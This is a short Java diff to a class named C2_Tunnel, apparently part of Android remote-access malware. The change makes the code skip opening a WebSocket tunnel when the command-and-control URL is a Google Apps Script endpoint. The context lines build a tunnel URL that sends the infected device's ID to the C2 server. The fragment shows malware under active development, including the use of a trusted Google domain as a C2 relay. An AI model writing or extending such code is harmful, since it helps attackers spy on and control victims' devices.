@@ -50,6 +50,11 @@ public class C2_Tunnel {
             return;
         }
 
+        // Google Apps Script endpoint is HTTP POST only, not a WebSocket server
+        if (c2Url.contains("script.google.com") || c2Url.contains("script.googleusercontent.com")) {
+            return;
+        }
+
         String deviceId = C2_Uploader.getDeviceId(context);
         String wsUrl = c2Url.replace("http://", "ws://").replace("https://", "wss://") + "/tunnel?deviceId=" + deviceId;
 
